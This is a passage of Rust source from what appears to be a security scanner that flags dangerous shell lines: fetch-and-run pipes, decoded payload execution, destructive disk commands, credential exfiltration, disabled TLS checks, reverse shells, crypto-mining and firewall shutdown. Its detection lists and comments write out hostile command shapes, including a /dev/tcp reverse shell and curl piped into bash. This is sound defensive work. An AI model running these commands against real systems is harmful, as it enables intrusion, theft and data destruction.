            let Some(command) = command else {
                continue;
            };
            if command.path.contains('/') {
                add(&command.path);
            }
            let arguments: Vec<&str> = command.arguments.iter().map(String::as_str).collect();
            // `cat x | sh`: what is read into a shell after it.
            let piped_into_shell = shell_after[at + 1];
            let name = command.program.as_str();
            if name == "cat" && piped_into_shell {
                for argument in &arguments {
                    if !argument.starts_with('-') {
                        add(argument);
                    }
                }
                continue;
            }
            let unversioned = unversioned(name);
            if !(RUNNERS.contains(&name)
                || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
            {
                continue;
            }
            // Code given on the command line, or only checked: no file.
            let options: Vec<&&str> = arguments
                .iter()
                .take_while(|word| word.starts_with('-'))
                .collect();
            let shell = PIPE_SHELLS.contains(&unversioned);
            if options.iter().any(|option| {
                matches!(**option, "-c" | "-n" | "-m" | "--check")
                    || (**option == "-e" && !shell)
                    || (shell
                        && option.len() > 2
                        && !option.starts_with("--")
                        && option.ends_with('c'))
            }) {
                continue;
            }
            if let Some(first) = arguments.iter().find(|word| !word.starts_with('-')) {
                add(first);
            }
        }
    }
    for name in extra_run_targets(line) {
        add(&name);
    }
    found
}

/// The directories and globs `line` names where what is in them is run or
/// read in as code, as written: the words of a loop (`for h in hooks.d/*`),
/// a glob given to a shell, an interpreter or `source`, a glob read into a
/// pipe (`cat dir/* | sh`), and the directory of `run-parts` and of a
/// `find` that runs or passes on what it finds. `run_targets` names single
/// files; which files these reach is known only where they run. What a
/// loop does with its words is on later lines, so every loop over paths
/// counts.
pub fn run_globs(line: &str) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    if !(line.contains(['*', '?'])
        || ["for ", "run-parts", "find "]
            .iter()
            .any(|sign| line.contains(sign)))
    {
        return found;
    }
    let is_glob = |word: &str| word.contains(['*', '?', '[']);
    let piped = line.contains('|');
    let flat = line.replace("&&", ";").replace("||", ";");
    for statement in flat.split([';', '|']).take(MAX_STATEMENTS) {
        // A command as a configuration's value (`exec = run-parts d`) is
        // read from after the key when the line does not start with one.
        let after_key = statement.split_once('=').map(|(_, value)| value);
        for statement in std::iter::once(statement).chain(after_key) {
            let named = globs_run_by(statement, piped, &is_glob);
            let known = !named.is_empty();
            for word in named {
                let word = word.trim_end_matches(')').to_string();
                if !word.is_empty() && !found.contains(&word) {
                    found.push(word);
                }
            }
            if known {
                break;
            }
        }
    }
    found
}

/// `run_globs` for one statement; `piped` says its line has a pipe.
fn globs_run_by(statement: &str, piped: bool, is_glob: &dyn Fn(&str) -> bool) -> Vec<String> {
    let Some(command) = shell::command(statement) else {
        return Vec::new();
    };
    let name = command.program.as_str();
    let unversioned = unversioned(name);
    // Also the value alone, as it is read from after the `=`.
    let value = statement.trim_start();
    let assigned = statement.contains("=$(")
        || statement.contains("=`")
        || value.starts_with("$(")
        || value.starts_with('`');
    let arguments: Vec<&str> = command.arguments.iter().map(String::as_str).collect();
    let operands = arguments
        .iter()
        .copied()
        .filter(|word| !word.starts_with('-'));
    let named: Vec<&str> = match name {
        "for" | "select" => operands
            .skip_while(|word| *word != "in")
            .skip(1)
            .take_while(|word| *word != "do")
            .filter(|word| word.contains('/') || is_glob(word))
            .collect(),
        "run-parts" => operands.collect(),
        // The places searched come before the first test.
        // What a variable is given (`x=$(find … | head -n 1)`) is a name
        // found, not a file run.
        "find"
            if !assigned && (piped || statement.contains("-exec") || statement.contains("-ok")) =>
        {
            arguments
                .iter()
                .copied()
                .take_while(|word| !word.starts_with(['-', '(', '!', '\\']))
                .collect()
        }
        "cat" if !piped => Vec::new(),
        _ if name == "cat"
            || RUNNERS.contains(&name)
            || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)) =>
        {
            operands.filter(|word| is_glob(word)).collect()
        }
        _ => Vec::new(),
    };
    named.into_iter().map(ToString::to_string).collect()
}

/// Files a line runs or reads in that `run_targets`' shell reading does not
/// reach: make's includes, an interpreter given a file to read in on its
/// command line, a script sourced next to the running one, an archive read
/// in, and the commands in a `package.json`. Each name is returned as
/// written, for `run_targets` to clean.
fn extra_run_targets(line: &str) -> Vec<String> {
    let mut found = Vec::new();
    make_includes(line, &mut found);
    reads_in_file(line, &mut found);
    sourced_sibling(line, &mut found);
    unpacked_file(line, &mut found);
    package_json_runs(line, &mut found);
    found
}

/// make's `include x`, `-include x`, `sinclude x`, and `$(shell cat x)`.
fn make_includes(line: &str, found: &mut Vec<String>) {
    let mut words = line.split_whitespace();
    if let Some(first) = words.next()
        && matches!(first.trim_start_matches('-'), "include" | "sinclude")
    {
        found.extend(words.map(ToString::to_string));
    }
    if let Some(at) = line.find("$(shell cat ") {
        let rest = &line[at + "$(shell cat ".len()..];
        found.extend(
            rest.split(')')
                .next()
                .and_then(|inside| inside.split_whitespace().next())
                .map(ToString::to_string),
        );
    }
}

/// An interpreter told on its command line to read a file in: `sh -c
/// "$(cat x)"`, `python -c "exec(open('x').read())"`, `node -e
/// "require('./x')"`.
fn reads_in_file(line: &str, found: &mut Vec<String>) {
    // `$(cat x)` / `` `cat x` `` whose output a shell runs (`sh -c
    // "$(cat x)"`, `eval "$(cat x)"`), not one only captured in a value.
    for substitution in shell::substitutions(line) {
        if shell::is_run(line, &substitution)
            && let Some(command) = shell::command(substitution.body)
            && command.program == "cat"
        {
            found.extend(command.operands().next().map(ToString::to_string));
        }
    }
    // `open('x')` inside an `exec`/`eval` argument.
    for argument in encoded::run_arguments(line) {
        for opener in ["open('", "open(\"", "read_text('", "read_text(\""] {
            if let Some(at) = argument.find(opener) {
                let rest = &argument[at + opener.len()..];
                found.extend(rest.split(['\'', '"']).next().map(ToString::to_string));
            }
        }
    }
}

/// A script read in beside the running one: `. "$(dirname "$0")/x"`,
/// `source "${BASH_SOURCE%/*}/x"`.
fn sourced_sibling(line: &str, found: &mut Vec<String>) {
    let statement = line.trim_start();
    let Some(rest) = statement
        .strip_prefix(". ")
        .or_else(|| statement.strip_prefix("source "))
    else {
        return;
    };
    let argument = rest.trim().trim_matches(['"', '\'']);
    if argument.contains("dirname ") || argument.contains("bash_source") || argument.contains("${0")
    {
        found.extend(as_file(program_name(argument)));
    }
}

/// Archives read in: `tar xf x`, `tar -xf x`, `bsdtar -xf x`, `unzip x`,
/// `7z x x`. Reported like a run, since an extract step feeds a build.
fn unpacked_file(line: &str, found: &mut Vec<String>) {
    for statement in shell::statements(line) {
        let Some(command) = shell::command(statement) else {
            continue;
        };
        let operands: Vec<String> = command.operands().map(ToString::to_string).collect();
        // The archive is the value of `-f`, or the first operand that is
        // not the mode word (`x`, `xf`, the 7z verb).
        let file_option = command
            .arguments
            .iter()
            .position(|word| word == "-f" || word == "--file")
            .and_then(|at| command.arguments.get(at + 1))
            .or_else(|| {
                command
                    .arguments
                    .iter()
                    .find_map(|word| word.strip_prefix("--file=").map(|_| word))
            });
        let archive = match command.program.as_str() {
            "tar" | "bsdtar"
                if command.has_short('x')
                    || operands.first().is_some_and(|word| word.contains('x')) =>
            {
                file_option
                    .map(|word| word.trim_start_matches("--file=").to_string())
                    .or_else(|| {
                        operands
                            .iter()
                            .find(|word| !word.chars().all(|c| "xfvzjJ-".contains(c)))
                            .cloned()
                    })
            }
            "unzip" => operands.into_iter().next(),
            "7z" | "7za" | "7zr"
                if operands
                    .first()
                    .is_some_and(|word| matches!(word.as_str(), "x" | "e")) =>
            {
                operands.into_iter().nth(1)
            }
            _ => None,
        };
        found.extend(archive.as_deref().and_then(as_file));
    }
}

/// The commands a `package.json` script line runs: `"postinstall": "node
/// scripts/x.js"`, and any `"scripts"` entry.
fn package_json_runs(line: &str, found: &mut Vec<String>) {
    let trimmed = line.trim_start();
    if !trimmed.starts_with('"') {
        return;
    }
    let Some((key, value)) = trimmed[1..].split_once("\":") else {
        return;
    };
    // A key naming a lifecycle script or any entry of the scripts map.
    let script_key = key.ends_with("install")
        || key.ends_with("prepare")
        || key.ends_with("prepublish")
        || matches!(
            key,
            "start" | "build" | "postinstall" | "preinstall" | "prestart"
        );
    if !script_key && !trimmed.contains("script") {
        // Only recognised script keys, to stay off ordinary JSON strings.
        return;
    }
    let value = value.trim().trim_end_matches(',');
    if let Some(command) = value
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
    {
        found.extend(run_targets(&command.replace("\\\"", "\"")));
    }
}

/// Variables a file sets to a fetcher or a shell (`F=curl`, `S="bash"`),
/// lowercased, so `$F … | $S` is judged as what it runs.
pub fn command_variables(text: &str) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = Vec::new();
    for line in text.lines() {
        let line = line.trim().strip_prefix("export ").unwrap_or(line.trim());
        let Some((name, value)) = line.split_once('=') else {
            continue;
        };
        let value = value.trim_matches(['"', '\'']);
        let is_name = !name.is_empty()
            && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
        let program = program_name(value);
        if is_name
            && !value.contains(char::is_whitespace)
            && (FETCHERS.contains(&program) || PIPE_SHELLS.contains(&program))
        {
            let name = name.to_ascii_lowercase();
            found.retain(|(known, _)| *known != name);
            found.push((name, program.to_string()));
            if found.len() > MAX_COMMAND_VARIABLES {
                found.remove(0);
            }
        }
    }
    found
}

/// The most such variables one file keeps.
const MAX_COMMAND_VARIABLES: usize = 32;

/// `code` with `$name` and `${name}` of `variables` written out. Names are
/// matched as given: a caller that wants it case-blind lowercases both.
pub fn with_variables(code: &str, variables: &[(String, String)]) -> String {
    if variables.is_empty() || !code.contains('$') {
        return code.to_string();
    }
    let mut out = code.to_string();
    for (name, value) in variables {
        out = out.replace(&format!("${{{name}}}"), value);
        // `$name` only where the name ends there.
        let pattern = format!("${name}");
        let mut result = String::with_capacity(out.len());
        let mut rest = out.as_str();
        while let Some(at) = rest.find(&pattern) {
            let after = &rest[at + pattern.len()..];
            result.push_str(&rest[..at]);
            if after.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
                result.push_str(&pattern);
            } else {
                result.push_str(value);
            }
            rest = after;
        }
        result.push_str(rest);
        out = result;
    }
    out
}

/// The most pipeline parts of one statement looked at.
const MAX_SEGMENTS: usize = 64;

/// The most statements of one line looked at for what they run.
const MAX_STATEMENTS: usize = 64;

/// A shell reading a fetch through process substitution (`sh <(curl …)`,
/// `source <(curl …)`) or running a command substitution of one
/// (`bash -c "$(curl …)"`, `eval "$(curl …)"`).
fn runs_fetched_text(line: &str) -> bool {
    let substituted = FETCHERS.iter().any(|fetcher| {
        ["<(", "$(", "`"].iter().any(|open| {
            line.contains(&format!("{open}{fetcher}"))
                || line.contains(&format!("{open} {fetcher}"))
        })
    });
    substituted
        && (line.contains("<(")
            || ["sh -c", "bash -c", "zsh -c", "eval "]
                .iter()
                .any(|runner| contains_pattern(line, runner)))
}

/// Other interpreters that run what is piped into them. They double as
/// ordinary words in a regex alternation (`(curl|perl|wget)`), so a pipe
/// into one counts only when the pipe has whitespace beside it, as a real
/// pipeline does and an alternation does not.
const PIPE_INTERPRETERS: &[&str] = &["python", "perl", "ruby", "node", "php", "lua"];

/// Whether the program word of a pipeline segment reads and runs its input:
/// a shell or another interpreter, `source`/`.`, a `$SHELL` variable, or
/// `busybox sh`.
fn consumes_pipe<'a>(word: &str, mut rest: impl Iterator<Item = &'a str>, spaced: bool) -> bool {
    // In a JSON or QML string the command ends at `",` or `"]`.
    let cleaned = word
        .trim_end_matches([',', ']'])
        .trim_matches(['(', '{', ')', '}', ';', '&', '"', '\'', '`', ' ']);
    let program = program_name(cleaned);
    // `source /dev/stdin`, `. /dev/stdin`.
    if matches!(program, "source" | ".") {
        return rest.any(|argument| argument.contains("/dev/stdin"));
    }
    // A shell kept in a variable (`$SHELL`), expanded or not.
    if matches!(cleaned, "$shell" | "${shell}" | "$0") {
        return true;
    }
    if program == "busybox" {
        return rest
            .next()
            .is_some_and(|next| matches!(next, "sh" | "ash" | "bash"));
    }
    [program, unversioned(program)].iter().any(|name| {
        !name.is_empty()
            && (PIPE_SHELLS.contains(name) || (spaced && PIPE_INTERPRETERS.contains(name)))
    })
}

/// Whether a pipeline segment for which `source` holds is followed, later in
/// the pipeline, by a command reading it: `| sh`, `| sudo bash`, `|/bin/sh`,
/// `| timeout 5 python`, `| { bash; }`, `| xargs sh -c`.
fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
    // `a || b` runs b instead of a, not on its output.
    let line = line.replace("||", ";");
    let segments: Vec<&str> = line.split('|').collect();
    let Some(first) = segments.iter().position(|segment| source(segment)) else {
        return false;
    };
    (first + 1..segments.len()).any(|index| {
        // A real pipe has whitespace on a side; a regex alternation
        // (`a|perl|b`) does not.
        let spaced = segments[index - 1].ends_with(char::is_whitespace)
            || segments[index].starts_with(char::is_whitespace);
        // A segment cut at a pipe may open a quote it does not close
        // (`sh -c "a | sh"`), so its words are cut at whitespace alone and
        // a quote before a word is taken off it. Wrappers that run the
        // command after them do not change what it is, so `| timeout 5 sh`
        // still reads the pipe into a shell.
        let mut words = segments[index]
            .split_whitespace()
            .map(|word| word.trim_start_matches(['(', '{', '"', '\'']));
        let Some(word) = shell::program_word(&mut words) else {
            return false;
        };
        // `xargs sh -c '…'`: xargs hands the input to the shell.
        if program_name(word) == "xargs" {
            let mut rest = words.skip_while(|argument| argument.starts_with('-'));
            return rest
                .next()
                .is_some_and(|program| consumes_pipe(program, rest, spaced));
        }
        consumes_pipe(word, words, spaced)
    })
}

fn is_encoded_command_execution(line: &str) -> bool {
    contains_any(line, ENCODED_PIPES)
        || pipes_into_shell(line, |segment| {
            [
                "base64 -d",
                "base64 --decode",
                "xxd -r",
                "openssl base64 -d",
                "openssl enc -d",
            ]
            .iter()
            .any(|decoder| segment.contains(decoder))
        })
        || is_encoded_data_executed(line)
        || encoded::matches(line)
}

pub fn is_encoded_data_executed(line: &str) -> bool {
    let decodes_data =
        line.contains("base64.b64decode(") || line.contains("[convert]::frombase64string");
    let executes_data = ["exec(", "eval(", "os.system(", "invoke-expression", "iex "]
        .iter()
        .any(|pattern| line.contains(pattern));
    decodes_data && executes_data
}

fn is_privilege_escalation(line: &str) -> bool {
    match without_sandbox_helper_setuid(line) {
        Some(rest) => contains_any(&rest, PRIVILEGE_ESCALATION),
        None => contains_any(line, PRIVILEGE_ESCALATION),
    }
}

/// The setuid sandbox helpers of Chromium-based browsers and Electron apps.
/// They must be setuid root to sandbox their renderers, so every package of
/// Chrome, Brave, Edge, Opera, Vivaldi or an Electron app sets them up.
const SANDBOX_HELPERS: &[&str] = &[
    "chrome-sandbox",
    "chrome_sandbox",
    "msedge-sandbox",
    "opera_sandbox",
    "vivaldi-sandbox",
];

/// Whether `path` names one of those helpers.
pub fn is_sandbox_helper(path: &str) -> bool {
    SANDBOX_HELPERS.contains(&path.rsplit('/').next().unwrap_or_default())
}

/// The line with every `chmod 4755` / `chmod u+s` / `chown root` of a lone
/// sandbox helper removed, or `None` when it has none. Any other privilege
/// change on the line still matches.
fn without_sandbox_helper_setuid(line: &str) -> Option<String> {
    let words = shell_words(line);
    let mut kept: Vec<&str> = Vec::with_capacity(words.len());
    let mut exempted = false;
    let mut index = 0;
    while index < words.len() {
        let sets_up_helper = matches!(
            (
                words[index].as_str(),
                words.get(index + 1).map(String::as_str)
            ),
            ("chmod", Some("4755" | "u+s")) | ("chown", Some("root" | "root:root"))
        ) && words.get(index + 2).is_some_and(|target| {
            let target = unquoted(target.trim_end_matches(';'));
            SANDBOX_HELPERS.contains(&target.rsplit('/').next().unwrap_or_default())
        }) && words.get(index + 3).is_none_or(|next| {
            matches!(next.as_str(), "||" | "&&" | ";" | "|" | "2>/dev/null")
                || words[index + 2].ends_with(';')
        });
        if sets_up_helper {
            exempted = true;
            index += 3;
        } else {
            kept.push(&words[index]);
            index += 1;
        }
    }
    exempted.then(|| kept.join(" "))
}

fn is_destructive_operation(line: &str) -> bool {
    contains_any(line, DESTRUCTIVE_COMMANDS)
        || writes_a_device(line)
        || redirects_onto_device(line)
        || relabels_partition_table(line)
        || formats_filesystem(line)
        || removes_root_or_home(line)
}

/// Raw block devices, by the prefix their names share. A redirection onto
/// one overwrites the disk: `: > /dev/sda`, `cat x > /dev/nvme0n1`.
const BLOCK_DEVICES: &[&str] = &[
    "/dev/sd",
    "/dev/nvme",
    "/dev/vd",
    "/dev/hd",
    "/dev/mmcblk",
    "/dev/loop",
    "/dev/xvd",
];

/// A `>`/`>>` onto a whole block device.
fn redirects_onto_device(line: &str) -> bool {
    unquoted_words(line)
        .into_iter()
        .filter_map(|word| {
            word.strip_prefix(">>")
                .or_else(|| word.strip_prefix('>'))
                .map(ToString::to_string)
        })
        .chain(
            // `> /dev/sda` with a space: the device is the next word.
            line.split('>')
                .skip(1)
                .filter_map(|rest| rest.split_whitespace().next().map(unquoted)),
        )
        .any(|target| {
            BLOCK_DEVICES.iter().any(|device| {
                target
                    .strip_prefix(device)
                    .is_some_and(|rest| rest.chars().all(|c| c.is_ascii_alphanumeric()))
            })
        })
}

/// `parted … mklabel` / `mktable`, which replaces a disk's partition table.
fn relabels_partition_table(line: &str) -> bool {
    shell::statements(line).iter().any(|statement| {
        shell::command(statement).is_some_and(|command| {
            command.program == "parted"
                && command
                    .arguments
                    .iter()
                    .any(|word| matches!(word.as_str(), "mklabel" | "mktable"))
        })
    })
}

/// `dd` writing to a block device, in either argument order.
fn writes_a_device(line: &str) -> bool {
    let words = unquoted_words(line);
    words
        .iter()
        .any(|word| word == "dd" || word.ends_with("/dd"))
        && words.iter().any(|word| {
            word.strip_prefix("of=/dev/").is_some_and(|device| {
                !matches!(device, "null" | "stdout" | "stderr" | "zero")
                    && !device.starts_with("fd/")
                    && !device.starts_with("shm/")
            })
        })
}

/// Commands that only handle a file by name, so a `mkfs.*` argument is a
/// program being packaged or inspected rather than run.
const FILE_COMMANDS: &[&str] = &[
    "install",
    "cp",
    "mv",
    "ln",
    "chmod",
    "chown",
    "rm",
    "strip",
    "patchelf",
    "touch",
    "ls",
    "stat",
    "file",
    "test",
    "[",
    "sha256sum",
    "b2sum",
    "md5sum",
];

/// A `mkfs.*` program that is run. Packaging one (`install -Dm755
/// mkfs.erofs "$pkgdir/..."`, or its path alone on a continuation line) is
/// not; every other mention is, including inside another language's string.
fn formats_filesystem(line: &str) -> bool {
    if !line.contains("mkfs.") {
        return false;
    }
    line.split([';', '|', '&'])
        .filter(|segment| segment.contains("mkfs."))
        .any(|segment| {
            // A path alone, as on a continuation line, runs nothing.
            if segment
                .split_whitespace()
                .filter(|word| *word != "\\")
                .count()
                <= 1
            {
                return false;
            }
            let words = unquoted_words(segment);
            let mut rest = words.iter().map(String::as_str);
            let handles_file = shell::program_word(&mut rest)
                .is_some_and(|program| FILE_COMMANDS.contains(&program_name(program)));
            // What stands before the program may run one itself:
            // `X="$(mkfs.ext4 /dev/sda)" ls`.
            let before = &words[..words.len() - rest.len()];
            // The word a wrapper's option takes may read as a file
            // command (`env -u install mkfs.ext4 …`): after an option,
            // the program found is not taken for one.
            let after_option = before
                .len()
                .checked_sub(2)
                .and_then(|index| before.get(index))
                .is_some_and(|word| word.starts_with('-') && !word.contains('=') && word != "--");
            !handles_file || after_option || before.iter().any(|word| word.contains("mkfs."))
        })
}

/// Recursive `rm` of `/`, `/*`, `~` or `$HOME` itself. Removing paths below
/// them (`rm -rf /tmp/build`, `rm -rf "$pkgdir"`) is ordinary build hygiene.
pub fn removes_root_or_home(line: &str) -> bool {
    let tokens: Vec<&str> = line.split_whitespace().collect();

    tokens.iter().enumerate().any(|(index, token)| {
        let command = token.trim_start_matches(['(', '`', '{']);
        if command != "rm" && !command.ends_with("/rm") {
            return false;
        }

        let mut arguments = Vec::new();
        for argument in &tokens[index + 1..] {
            if matches!(*argument, ";" | "&&" | "||" | "|" | "&") {
                break;
            }
            arguments.push(*argument);
            if argument.ends_with([';', '&', '|']) {
                break;
            }
        }
        let recursive = arguments.iter().any(|argument| {
            *argument == "--recursive"
                || argument
                    .strip_prefix('-')
                    .is_some_and(|flags| !flags.starts_with('-') && flags.contains('r'))
        });

        recursive
            && arguments
                .iter()
                .filter(|argument| !argument.starts_with('-'))
                .any(|argument| {
                    let target = argument
                        .trim_end_matches([';', ')', '`'])
                        .trim_matches(['"', '\'']);
                    is_root_or_home(target)
                })
    })
}

fn is_root_or_home(target: &str) -> bool {
    let base = target.trim_end_matches(['/', '*']);
    (target.starts_with('/') && base.is_empty()) || matches!(base, "~" | "$home" | "${home}")
}

/// A credential file named in the plain list, or a credential store handed
/// to a command that takes it (see `exfil::takes_credential`).
fn references_credential(line: &str) -> bool {
    contains_any(line, CREDENTIAL_FILES)
        || (exfil::mentions_credential(line) && exfil::takes_credential(line))
}

pub fn looks_like_credential_exfiltration(line: &str) -> bool {
    if exfil::sends_secret(line) {
        return true;
    }
    let sends_data = [
        "curl ",
        "wget ",
        "fetch(",
        "requests.post(",
        "axios.post(",
        ".post(",
        ".put(",
        "http.post(",
        "http.request(",
        "upload(",
        "socket.send(",
        "websocket",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    if !sends_data {
        return false;
    }

    let reads_secret_variable = [
        "process.env",
        "os.environ",
        "getenv(",
        "cookie",
        "authorization",
        "password",
        "secret",
        "api_key",
        "token",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    let reads_sensitive_file = contains_any(line, CREDENTIAL_FILES)
        && [
            " -d @",
            "--data @",
            "--data-binary @",
            "-f @",
            "open(",
            "readfile(",
            "read_file(",
            "read_to_string(",
            "readtext(",
            "read_text(",
            "read_bytes(",
        ]
        .iter()
        .any(|pattern| line.contains(pattern));

    reads_secret_variable || reads_sensitive_file
}

/// Settings that switch off TLS certificate checking, by any of the common
/// tools. Each is distinctive enough to match as plain text.
const DISABLED_TLS_PATTERNS: &[&str] = &[
    "--no-check-certificate",
    "insecureskipverify: true",
    "insecureskipverify:true",
    "rejectunauthorized: false",
    "rejectunauthorized:false",
    "node_tls_reject_unauthorized=0",
    "verify=false",
    "cert_none",
    "ssl._create_unverified_context",
    "_create_unverified_https_context",
    "git_ssl_no_verify=",
    "pythonhttpsverify=0",
    "--proxy-insecure",
    "stricthostkeychecking=no",
    "strict-ssl=false",
    "strict-ssl false",
    "--trusted-host",
    "curl_sslverify_none",
];

/// Commands that only show what they are given.
const PRINTERS: &[&str] = &["echo", "printf"];

/// Whether a short-flag cluster of one of `programs` carries the flag
/// letter `flag`: `-k`, `-sk`, `-fsSLk`, before or after the command's
/// other arguments (`curl URL -k -o f`), but not `--key` nor a flag of
/// another command on the line. A program is matched without its path.
///
/// `unless` names options that give the flag another meaning in the same
/// command: one letter for a short flag, a whole word otherwise.
fn program_short_flag(line: &str, programs: &[&str], flag: char, unless: &[&str]) -> bool {
    // A quote inside a name is no part of it: `c""url`.
    let plain;
    let text = if line.contains(['"', '\'']) {
        plain = unquoted(line);
        plain.as_str()
    } else {
        line
    };
    if !programs.iter().any(|program| text.contains(program)) {
        return false;
    }
    // The parts follow one another in the line, so what divides each from
    // the next is read where it ends.
    let mut start = 0;
    for part in shell::split_top(line, &["&&", "||", ";", "|", "&", "\n"]) {
        let end = start + part.len();
        let after = line.get(end..).unwrap_or_default();
        let doubled = after.starts_with("&&") || after.starts_with("||");
        let piped = after.starts_with('|') && !doubled;
        if part_short_flag(part, piped, programs, flag, unless) {
            return true;
        }
        start = end + if doubled { 2 } else { 1 };
    }
    false
}

/// Whether `word` ends a command inside a part that was not cut there (a
/// part that opens a group it does not close is not cut inside it).
fn ends_command(word: &str) -> bool {
    matches!(word, ";" | "|" | "&&" | "||" | "&") || word.ends_with(';')
}

/// `program_short_flag` for one command; `piped` says a pipe carries its
/// output on.
fn part_short_flag(
    part: &str,
    piped: bool,
    programs: &[&str],
    flag: char,
    unless: &[&str],
) -> bool {
    if !(part.contains('-') && part.contains(flag)) {
        return false;
    }
    let words = unquoted_words(part);
    let mut rest = words.iter().map(String::as_str);
    let command = shell::program_word(&mut rest).map(program_name);
    // The words up to and with the command: wrappers, assignments, and
    // the program `shell::command` finds.
    let leading = words.len() - rest.len();
    // Shown, not run, unless what is shown goes on into a pipe or a file,
    // or another command follows in the same part.
    if command.is_some_and(|command| PRINTERS.contains(&command))
        && !piped
        && !part.contains('>')
        && !words.iter().any(|word| ends_command(word))
    {
        return false;
    }
    // Every option up to the end of the command is its own when the
    // program is the command. Named before it or further on (`CURL=curl
    // make -k`, `xargs curl -k`), only those before its first operand
    // are: another program may follow.
    let (mut own, mut running) = (false, false);
    // Whether the command so far has the flag, and an option that gives
    // the flag another meaning.
    let (mut has, mut other) = (false, false);
    for (index, word) in words.iter().enumerate() {
        let option = word.trim_end_matches([';', ')', '`']);
        if matches!(word.as_str(), ";" | "|" | "&&" | "||" | "&") {
            if has && !other {
                return true;
            }
            (own, running, has, other) = (false, false, false, false);
            continue;
        }
        if word.starts_with('-') {
            if running {
                has |= short_flag(option, flag);
                other |= unless.iter().any(|name| {
                    let mut letters = name.chars();
                    match (letters.next(), letters.next()) {
                        (Some(letter), None) => short_flag(option, letter),
                        _ => option == *name,
                    }
                });
            }
        } else if !own {
            let name = match command {
                Some(command) if index + 1 == leading => command,
                _ => program_name(word),
            };
            running = programs.contains(&name);
            own = running && index + 1 == leading;
        }
        if word.ends_with(';') {
            if has && !other {
                return true;
            }
            (own, running, has, other) = (false, false, false, false);
        }
    }
    has && !other
}

/// Whether a command named in `programs` is on the line with one of
/// `exact_flags` among its own arguments (or, with an empty `exact_flags`,
/// simply present as a command). Arguments stop at a command separator, so
/// a flag of a later command does not count.
fn command_has_flag(line: &str, programs: &[&str], exact_flags: &[&str]) -> bool {
    let words = unquoted_words(line);
    let mut index = 0;
    while index < words.len() {
        if programs.contains(&program_name(&words[index])) {
            if exact_flags.is_empty() {
                return true;
            }
            for argument in &words[index + 1..] {
                if matches!(argument.as_str(), ";" | "|" | "&&" | "||" | "&") {
                    break;
                }
                if exact_flags.contains(&argument.as_str()) {
                    return true;
                }
            }
        }
        index += 1;
    }
    false
}

fn disables_tls_verification(line: &str) -> bool {
    if contains_any(line, DISABLED_TLS_PATTERNS) {
        return true;
    }
    // `--insecure` is curl's and others'; a bare `-k` is only curl's.
    if contains_pattern(line, "--insecure") {
        return true;
    }
    // git's own switch, written as a config key either way round.
    let git_off = [
        "http.sslverify false",
        "http.sslverify=false",
        "sslverify=false",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    if git_off && line.contains("git") {
        return true;
    }
    program_short_flag(line, &["curl"], 'k', &[])
}

/// A shell wired to a network connection, so the commands come from
/// elsewhere. The plain `/dev/tcp/` form is already download-and-execute;
/// these are the shapes that hide the socket or build it in another
/// language.
fn is_remote_shell(line: &str) -> bool {
    // netcat and ncat running a program on connect: the flag must be one
    // of the command's own, not any `-e` on the line (`echo -e`).
    let netcat = command_has_flag(line, &["nc", "ncat"], &["-e", "-c", "--exec", "--sh-exec"]);
    // socat giving a connection a shell.
    let socat = command_has_flag(line, &["socat"], &[])
        && (line.contains("exec:") || line.contains("system:"))
        && ["sh", "bash", "/bin/", "-i"]
            .iter()
            .any(|word| line.contains(word));
    // `/dev/tcp` built up through a variable: `d=/dev; sh -i >& $d/tcp/h/p`.
    let indirect_tcp = line.contains("/tcp/")
        && (line.contains(">&") || line.contains("0>&") || line.contains("<>"));
    // An interpreter opening a socket and wiring a shell to it: a socket
    // next to a terminal takeover, not a mere `import socket`.
    let python = line.contains("socket")
        && (line.contains("pty.spawn")
            || line.contains("os.dup2")
            || ((line.contains("/bin/sh") || line.contains("/bin/bash"))
                && ["subprocess", "os.system", "popen", "os.execv"]
                    .iter()
                    .any(|word| line.contains(word))));
    // The interpreter must be invoked with inline code, not merely named
    // inside a word (`wallpaperleft` holds `perl`).
    let perl = command_has_flag(line, &["perl"], &["-e"])
        && (line.contains("socket") || line.contains("sockaddr"))
        && (line.contains("exec") || line.contains("/bin/sh"));
    let php = command_has_flag(line, &["php"], &["-r"])
        && line.contains("fsockopen")
        && (line.contains("exec") || line.contains("proc_open"));
    let ruby = command_has_flag(line, &["ruby"], &["-e", "-rsocket"])
        && (line.contains("socket") || line.contains("-rsocket"))
        && (line.contains("exec") || line.contains("/bin/sh"));
    let awk = line.contains("/inet/tcp/") || line.contains("/inet/udp/");
    let piped = (line.contains("telnet") || line.contains("openssl s_client"))
        && pipes_into_shell(line, |segment| {
            segment.contains("telnet") || segment.contains("s_client")
        });
    netcat || socat || indirect_tcp || python || perl || php || ruby || awk || piped
}

/// Miners, mining pools and the stratum protocol.
const MINING_MARKERS: &[&str] = &[
    "stratum+tcp://",
    "stratum+ssl://",
    "stratum2+tcp://",
    "xmrig",
    "minerd",
    "cpuminer",
    "--donate-level",
    "pool.minexmr.",
    "supportxmr.com",
    "nanopool.org",
    "2miners.com",
    "pool.hashvault.pro",
    "minexmr.com",
    "randomx",
    "--coin monero",
    "--cinit-algo",
];

fn is_crypto_mining(line: &str) -> bool {
    MINING_MARKERS.iter().any(|marker| line.contains(marker))
}

/// Security services whose removal leaves the system more exposed, Guardian
/// among them.
const PROTECTED_SERVICES: &[&str] = &[
    "firewalld",
    "ufw",
    "nftables",
    "iptables",
    "apparmor",
    "auditd",
    "clamav",
    "omarchy-guardian",
];

fn disables_protection(line: &str) -> bool {
    // Turning a security service off or masking it.
    let systemctl = line.contains("systemctl")
        && (line.contains("mask") || line.contains("disable") || line.contains("stop"))
        && PROTECTED_SERVICES
            .iter()
            .any(|service| line.contains(service));
    let ufw_off = line.contains("ufw disable") || line.contains("ufw --force disable");
    let flush = line.contains("nft flush ruleset")
        // Lowercased, `-f` is also the fragment match of a rule. A rule
        // is appended, inserted, deleted, replaced or checked, and names
        // a target; a flush does none of that.
        || program_short_flag(
            line,
            &["iptables", "ip6tables"],
            'f',
            &[
